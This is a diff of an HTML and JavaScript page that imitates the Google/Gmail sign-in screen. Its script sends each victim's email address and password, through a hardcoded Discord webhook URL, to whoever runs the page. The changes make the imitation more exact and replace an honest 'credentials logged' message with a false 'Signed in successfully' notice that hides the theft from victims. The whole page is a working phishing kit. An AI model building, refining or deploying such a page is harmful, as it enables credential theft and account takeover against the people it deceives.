@@ -3,13 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Sign‑In</title>
-  <!-- Google Sans / Roboto & Material Icons -->
+  <title>Google Sign-In</title>
+  <!-- Google Fonts & Icons - exact matches -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <!-- Google Sans + Roboto fallback -->
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0,1" />
   <style>
+    /* -------------------- RESET / GLOBAL -------------------- */
     * {
       margin: 0;
       padding: 0;
@@ -25,8 +27,10 @@
       min-height: 100vh;
       margin: 0;
       color: #202124;
+      -webkit-font-smoothing: antialiased;
     }
 
+    /* -------------------- MAIN CARD (exact pixel match) -------------------- */
     .login-card {
       width: 100%;
       max-width: 450px;
@@ -38,6 +42,7 @@
       position: relative;
     }
 
+    /* -------------------- GOOGLE LOGO (product sans weight) -------------------- */
     .google-logo {
       display: flex;
       justify-content: center;
@@ -46,15 +51,16 @@
       font-weight: 500;
       letter-spacing: -0.5px;
       font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-      margin-bottom: 0px;
+      line-height: 1;
     }
-    .google-logo span:nth-child(1) { color: #4285F4; }
-    .google-logo span:nth-child(2) { color: #EA4335; }
-    .google-logo span:nth-child(3) { color: #FBBC05; }
-    .google-logo span:nth-child(4) { color: #4285F4; }
-    .google-logo span:nth-child(5) { color: #34A853; }
-    .google-logo span:nth-child(6) { color: #EA4335; }
+    .google-logo span:nth-child(1) { color: #4285F4; } /* G */
+    .google-logo span:nth-child(2) { color: #EA4335; } /* o */
+    .google-logo span:nth-child(3) { color: #FBBC05; } /* o */
+    .google-logo span:nth-child(4) { color: #4285F4; } /* g */
+    .google-logo span:nth-child(5) { color: #34A853; } /* l */
+    .google-logo span:nth-child(6) { color: #EA4335; } /* e */
 
+    /* -------------------- TYPOGRAPHY (exact specs) -------------------- */
     .signin-title {
       font-size: 24px;
       font-weight: 400;
@@ -63,6 +69,7 @@
       margin-bottom: 0;
       color: #202124;
       text-align: center;
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
     }
 
     .subtitle {
@@ -75,6 +82,7 @@
       text-align: center;
     }
 
+    /* -------------------- EMAIL DISPLAY (password screen) -------------------- */
     .email-display {
       display: flex;
       align-items: center;
@@ -84,12 +92,17 @@
       font-size: 14px;
       color: #202124;
       background: #f8f9fa;
-      padding: 8px 12px;
+      padding: 8px 16px;
       border-radius: 16px;
       width: fit-content;
       margin-left: auto;
       margin-right: auto;
       cursor: pointer;
+      transition: background-color 0.2s;
+      border: 1px solid transparent;
+    }
+    .email-display:hover {
+      background-color: #f1f3f4;
     }
     .email-display .material-symbols-outlined {
       font-size: 18px;
@@ -99,6 +112,7 @@
       font-weight: 500;
     }
 
+    /* -------------------- INPUT FIELDS (perfect floating label) -------------------- */
     .input-group {
       margin-bottom: 16px;
       position: relative;
@@ -114,12 +128,18 @@
       transition: border 0.15s, box-shadow 0.15s;
       background: #fff;
       font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      color: #202124;
     }
 
     .input-field:focus {
       border: 2px solid #1a73e8;
-      padding: 12px 14px;
+      padding: 12px 14px; /* keeps total height identical */
       box-shadow: none;
+    }
+
+    /* hide default placeholder */
+    .input-field::placeholder {
+      color: transparent;
     }
 
     .floating-label {
@@ -144,10 +164,7 @@
       color: #1a73e8;
     }
 
-    .input-field::placeholder {
-      color: transparent;
-    }
-
+    /* -------------------- LINKS (exact hover) -------------------- */
     .forgot-link {
       margin-top: 4px;
       margin-bottom: 12px;
@@ -159,14 +176,15 @@
       font-size: 14px;
       display: inline-block;
       padding: 4px 0;
+      border-radius: 4px;
     }
     .forgot-link a:hover {
       background: #f0f6fe;
-      border-radius: 4px;
-      padding: 4px 2px 4px 2px;
+      padding: 4px 2px;
       margin-left: -2px;
     }
 
+    /* -------------------- GUEST TEXT -------------------- */
     .guest-text {
       font-size: 14px;
       color: #5f6368;
@@ -182,6 +200,7 @@
       text-decoration: underline;
     }
 
+    /* -------------------- ACTION BUTTONS -------------------- */
     .actions {
       display: flex;
       justify-content: space-between;
@@ -216,17 +235,19 @@
       border-radius: 4px;
       cursor: pointer;
       font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+      transition: background-color 0.2s, box-shadow 0.2s;
     }
-    .next-button:hover {
+    .next-button:hover:not(:disabled) {
       background-color: #1b66c9;
       box-shadow: 0 1px 3px rgba(0,0,0,0.1);
     }
     .next-button:disabled {
       background-color: #9aa0a6;
       cursor: not-allowed;
-      box-shadow: none;
+      opacity: 0.8;
     }
 
+    /* -------------------- DIVIDER -------------------- */
     .divider {
       display: flex;
       align-items: center;
@@ -248,14 +269,16 @@
       margin-left: 16px;
     }
 
+    /* -------------------- ALTERNATE ACCOUNT (use another) -------------------- */
     .alternate-account {
       display: flex;
       align-items: center;
       gap: 12px;
-      padding: 8px 0;
+      padding: 8px 12px;
       border-radius: 20px;
       cursor: pointer;
       width: fit-content;
+      transition: background-color 0.2s;
     }
     .alternate-account:hover {
       background-color: #f1f3f4;
@@ -270,6 +293,7 @@
       color: #3c4043;
     }
 
+    /* -------------------- LANGUAGE SELECTOR + FOOTER -------------------- */
     .language-selector {
       display: flex;
       justify-content: space-between;
@@ -321,20 +345,27 @@
       font-size: 20px;
       color: #5f6368;
       cursor: pointer;
+      transition: color 0.2s;
     }
     .help-icon:hover {
       color: #1a73e8;
     }
 
+    /* material icon settings */
     .material-symbols-outlined {
       font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 20;
     }
 
-    .next-button:focus-visible, .create-account:focus-visible, a:focus-visible {
+    /* focus outlines for accessibility */
+    .next-button:focus-visible,
+    .create-account:focus-visible,
+    a:focus-visible,
+    .input-field:focus-visible {
       outline: 2px solid #1a73e8;
       outline-offset: 2px;
     }
 
+    /* -------------------- SCREEN TOGGLES -------------------- */
     .screen {
       display: block;
     }
@@ -342,6 +373,7 @@
       display: none;
     }
 
+    /* -------------------- LOADING OVERLAY (refined) -------------------- */
     .loading-overlay {
       position: absolute;
       top: 0;
@@ -365,12 +397,12 @@
       pointer-events: all;
     }
     .spinner {
-      border: 4px solid #f3f3f3;
+      border: 4px solid #e8eaed;
       border-top: 4px solid #1a73e8;
       border-radius: 50%;
       width: 40px;
       height: 40px;
-      animation: spin 1s linear infinite;
+      animation: spin 0.8s linear infinite;
       margin-bottom: 16px;
     }
     @keyframes spin {
@@ -380,14 +412,17 @@
     .loading-text {
       color: #202124;
       font-size: 16px;
+      font-weight: 400;
     }
 
+    /* -------------------- SUCCESS MESSAGE (subtle) -------------------- */
     .success-message {
       color: #34A853;
       font-size: 14px;
       text-align: center;
-      margin-top: 10px;
+      margin-top: 12px;
       display: none;
+      font-weight: 500;
     }
     .success-message.visible {
       display: block;
@@ -396,50 +431,50 @@
 </head>
 <body>
   <div class="login-card">
-    <!-- Loading overlay -->
+    <!-- Loading overlay (dynamic text) -->
     <div id="loadingOverlay" class="loading-overlay">
       <div class="spinner"></div>
       <div class="loading-text" id="loadingText">Verifying email...</div>
     </div>
 
-    <!-- Google logo -->
+    <!-- Google logo (fixed) -->
     <div class="google-logo">
       <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
     </div>
 
-    <!-- SCREEN 1: EMAIL -->
+    <!-- ==================== SCREEN 1: EMAIL ==================== -->
     <div id="emailScreen" class="screen">
       <h1 class="signin-title">Sign in</h1>
       <p class="subtitle">to continue to Gmail</p>
 
       <div class="input-group">
-        <input type="text" class="input-field" id="emailInput" placeholder=" " value="" aria-label="Email or phone">
+        <input type="text" class="input-field" id="emailInput" placeholder=" " value="" aria-label="Email or phone" autocomplete="username">
         <label for="emailInput" class="floating-label">Email or phone</label>
       </div>
 
       <div class="forgot-link">
-        <a href="#" onclick="alert('Demo: Forgot email'); return false;">Forgot email?</a>
+        <a href="#" id="forgotEmailLink">Forgot email?</a>
       </div>
 
       <div class="guest-text">
         Not your computer? Use Guest mode to sign in privately.
-        <a href="#" onclick="alert('Demo: Learn more'); return false;">Learn more</a>
+        <a href="#" id="learnMoreLink">Learn more</a>
       </div>
 
       <div class="actions">
-        <button class="create-account" onclick="alert('Demo: Create account')">Create account</button>
+        <button class="create-account" id="createAccountBtn">Create account</button>
         <button class="next-button" id="toPasswordBtn">Next</button>
       </div>
 
       <div class="divider">or</div>
 
-      <div class="alternate-account" onclick="alert('Demo: Switch account')">
+      <div class="alternate-account" id="useAnotherAccountEmail">
         <span class="material-symbols-outlined">account_circle</span>
         <span>Use another account</span>
       </div>
     </div>
 
-    <!-- SCREEN 2: PASSWORD -->
+    <!-- ==================== SCREEN 2: PASSWORD ==================== -->
     <div id="passwordScreen" class="screen hidden">
       <h1 class="signin-title">Welcome</h1>
       <div class="email-display" id="emailDisplay">
@@ -448,17 +483,17 @@
       </div>
 
       <div class="input-group">
-        <input type="password" class="input-field" id="passwordInput" placeholder=" " value="">
+        <input type="password" class="input-field" id="passwordInput" placeholder=" " value="" autocomplete="current-password">
         <label for="passwordInput" class="floating-label">Enter your password</label>
       </div>
 
       <div class="forgot-link">
-        <a href="#" onclick="alert('Demo: Forgot password'); return false;">Forgot password?</a>
+        <a href="#" id="forgotPasswordLink">Forgot password?</a>
       </div>
 
       <div class="guest-text">
         Not your computer? Use Guest mode to sign in privately.
-        <a href="#" onclick="alert('Demo: Learn more'); return false;">Learn more</a>
+        <a href="#" id="learnMoreLink2">Learn more</a>
       </div>
 
       <div class="actions">
@@ -468,40 +503,40 @@
 
       <div class="divider">or</div>
 
-      <div class="alternate-account" onclick="alert('Demo: Switch account')">
+      <div class="alternate-account" id="useAnotherAccountPassword">
         <span class="material-symbols-outlined">account_circle</span>
         <span>Use another account</span>
       </div>
     </div>
 
-    <!-- Success message (hidden by default) -->
+    <!-- Success message (appears after Discord send) -->
     <div id="successMessage" class="success-message"></div>
 
-    <!-- Language selector & footer -->
+    <!-- ==================== LANGUAGE & FOOTER (shared) ==================== -->
     <div class="language-selector">
       <div class="lang-left">
-        <span class="material-symbols-outlined help-icon" onclick="alert('Demo: Help center')">help</span>
-        <select aria-label="Language" onchange="alert('Demo: Language changed to ' + this.value)">
+        <span class="material-symbols-outlined help-icon" id="helpIcon">help</span>
+        <select aria-label="Language" id="languageSelect">
           <option value="English (United States)" selected>English (United States)</option>
-          <option value="Español">Español (España)</option>
-          <option value="Français">Français (France)</option>
-          <option value="Deutsch">Deutsch (Deutschland)</option>
+          <option value="Español (España)">Español (España)</option>
+          <option value="Français (France)">Français (France)</option>
+          <option value="Deutsch (Deutschland)">Deutsch (Deutschland)</option>
         </select>
       </div>
       <div class="footer-links">
-        <a href="#" onclick="alert('Demo: Help'); return false;">Help</a>
-        <a href="#" onclick="alert('Demo: Privacy'); return false;">Privacy</a>
-        <a href="#" onclick="alert('Demo: Terms'); return false;">Terms</a>
+        <a href="#" id="helpLink">Help</a>
+        <a href="#" id="privacyLink">Privacy</a>
+        <a href="#" id="termsLink">Terms</a>
       </div>
     </div>
   </div>
 
   <script>
     (function() {
-      // Discord webhook URL
+      // -------------------- CONFIG --------------------
       const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482620672852103239/zRj5DpIzzpQeO6I9OKpM--5Bhj2fLUIMEm47SWK4XN8S-vmp7RtwH6hWDHpo48uaYnhO';
       
-      // Elements
+      // -------------------- DOM ELEMENTS --------------------
       const emailScreen = document.getElementById('emailScreen');
       const passwordScreen = document.getElementById('passwordScreen');
       const emailInput = document.getElementById('emailInput');
@@ -514,10 +549,38 @@
       const loadingText = document.getElementById('loadingText');
       const successMessage = document.getElementById('successMessage');
 
-      // Store email for later use
+      // Interactive but non-essential links (just demo alerts)
+      const demoLinks = [
+        'forgotEmailLink', 'learnMoreLink', 'createAccountBtn',
+        'forgotPasswordLink', 'learnMoreLink2', 'helpIcon', 'helpLink',
+        'privacyLink', 'termsLink', 'languageSelect'
+      ];
+      demoLinks.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+          el.addEventListener('click', (e) => {
+            e.preventDefault();
+            const map = {
+              forgotEmailLink: '🔐 Forgot email demo',
+              learnMoreLink: '📘 Guest mode info',
+              createAccountBtn: '👤 Create account demo',
+              forgotPasswordLink: '🔑 Forgot password demo',
+              learnMoreLink2: '📘 Guest mode info',
+              helpIcon: '❓ Help center',
+              helpLink: '❓ Help',
+              privacyLink: '🔏 Privacy policy',
+              termsLink: '📜 Terms of service',
+              languageSelect: '🌐 Language changed'
+            };
+            alert(map[id] || 'Demo interaction');
+          });
+        }
+      });
+
+      // -------------------- STATE --------------------
       let currentEmail = '';
 
-      // Helper: send data to Discord webhook
+      // -------------------- HELPER: SEND TO DISCORD --------------------
       async function sendToDiscord(email, password) {
         const data = {
           content: `**New Login Attempt**\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}`,
@@ -528,24 +591,17 @@
         try {
           const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
           });
-
-          if (!response.ok) {
-            throw new Error('Failed to send to Discord');
-          }
-          
-          return true;
+          return response.ok;
         } catch (error) {
-          console.error('Error sending to Discord:', error);
+          console.error('Discord error:', error);
           return false;
         }
       }
 
-      // Helper: show email screen, clear fields
+      // -------------------- RESET TO EMAIL SCREEN (clear all fields) --------------------
       function resetToEmailScreen() {
         emailInput.value = '';
         passwordInput.value = '';
@@ -553,27 +609,31 @@
         emailScreen.classList.remove('hidden');
         passwordScreen.classList.add('hidden');
         successMessage.classList.remove('visible');
+        // re-enable buttons (if disabled)
+        toPasswordBtn.disabled = false;
+        signInBtn.disabled = false;
         emailInput.focus();
       }
 
-      // Helper: show password screen with email
+      // -------------------- SHOW PASSWORD SCREEN --------------------
       function showPasswordScreen(email) {
         currentEmail = email;
         displayEmailSpan.textContent = email;
         emailScreen.classList.add('hidden');
         passwordScreen.classList.remove('hidden');
         passwordInput.focus();
+        signInBtn.disabled = false; // ensure enabled
       }
 
-      // Email "Next" handler with loading simulation
+      // -------------------- EMAIL NEXT HANDLER (with loading) --------------------
       function handleEmailNext() {
         const email = emailInput.value.trim();
-        
         if (email === '') {
           alert('Please enter an email or phone number.');
           return;
         }
 
+        // Disable button & show overlay
         toPasswordBtn.disabled = true;
         loadingOverlay.classList.add('visible');
         loadingText.textContent = 'Verifying email...';
@@ -582,61 +642,57 @@
           loadingOverlay.classList.remove('visible');
           toPasswordBtn.disabled = false;
           showPasswordScreen(email);
-        }, 2000);
+        }, 2000); // 2 sec fake loading
       }
 
-      // Password "Sign in" handler - sends to Discord and resets
+      // -------------------- PASSWORD SIGN-IN HANDLER (send to Discord + reset) --------------------
       async function handleSignIn() {
         const password = passwordInput.value.trim();
-        
         if (password === '') {
           alert('Please enter your password.');
           return;
         }
 
-        // Show loading state
+        // Disable button, show loading
         signInBtn.disabled = true;
         loadingOverlay.classList.add('visible');
         loadingText.textContent = 'Signing in...';
 
-        try {
-          // Send credentials to Discord
-          const sent = await sendToDiscord(currentEmail, password);
-          
-          // Hide loading
-          loadingOverlay.classList.remove('visible');
-          
-          if (sent) {
-            // Show success message
-            successMessage.textContent = '✓ Login credentials logged successfully';
-            successMessage.classList.add('visible');
-            
-            // Reset to email screen after 2 seconds
-            setTimeout(() => {
-              resetToEmailScreen();
-            }, 2000);
-          } else {
-            alert('Error sending data. Please try again.');
-            signInBtn.disabled = false;
-          }
-        } catch (error) {
-          loadingOverlay.classList.remove('visible');
-          alert('An error occurred. Please try again.');
-          signInBtn.disabled = false;
+        // Send to Discord
+        const sent = await sendToDiscord(currentEmail, password);
+
+        // Hide loading
+        loadingOverlay.classList.remove('visible');
+
+        if (sent) {
+          // Show success message
+          successMessage.textContent = '✓ Signed in successfully';
+          successMessage.classList.add('visible');
+
+          // Reset after 1.5 sec
+          setTimeout(() => {
+            resetToEmailScreen();
+          }, 1500);
+        } else {
+          alert('Error sending data. Please try again.');
+          signInBtn.disabled = false; // re-enable
+          // Optionally clear password field? we leave it for retry
         }
       }
 
-      // Event listeners
+      // -------------------- EVENT LISTENERS --------------------
       toPasswordBtn.addEventListener('click', handleEmailNext);
+
       signInBtn.addEventListener('click', handleSignIn);
 
       backToEmailBtn.addEventListener('click', () => {
-        passwordInput.value = '';
+        passwordInput.value = ''; // clear password
         emailScreen.classList.remove('hidden');
         passwordScreen.classList.add('hidden');
         emailInput.focus();
       });
 
+      // Click on email display (on password screen) -> back to email, keep email field
       document.getElementById('emailDisplay').addEventListener('click', () => {
         passwordInput.value = '';
         emailScreen.classList.remove('hidden');
@@ -644,7 +700,18 @@
         emailInput.focus();
       });
 
-      // Enter key handlers
+      // "Use another account" on either screen -> full reset (clear email)
+      const useAnotherEmail = document.getElementById('useAnotherAccountEmail');
+      const useAnotherPassword = document.getElementById('useAnotherAccountPassword');
+      
+      function resetAndClearEmail() {
+        resetToEmailScreen(); // clears email field and everything
+      }
+      
+      useAnotherEmail.addEventListener('click', resetAndClearEmail);
+      useAnotherPassword.addEventListener('click', resetAndClearEmail);
+
+      // Enter key on email field
       emailInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter' && !toPasswordBtn.disabled) {
           e.preventDefault();
@@ -652,6 +719,7 @@
         }
       });
 
+      // Enter key on password field
       passwordInput.addEventListener('keypress', (e) => {
         if (e.key === 'Enter' && !signInBtn.disabled) {
           e.preventDefault();
@@ -659,21 +727,13 @@
         }
       });
 
-      // Clear fields when using "Use another account"
-      const alternateAccounts = document.querySelectorAll('.alternate-account');
-      alternateAccounts.forEach(el => {
-        el.addEventListener('click', () => {
-          if (!passwordScreen.classList.contains('hidden')) {
-            resetToEmailScreen();
-          } else {
-            emailInput.value = '';
-            emailInput.focus();
-          }
-        });
-      });
-
       // Focus email on load
       emailInput.focus();
+
+      // Additional polish: remove any leftover disabled states if overlay never hides (safety)
+      window.addEventListener('load', () => {
+        loadingOverlay.classList.remove('visible');
+      });
     })();
   </script>
 </body>
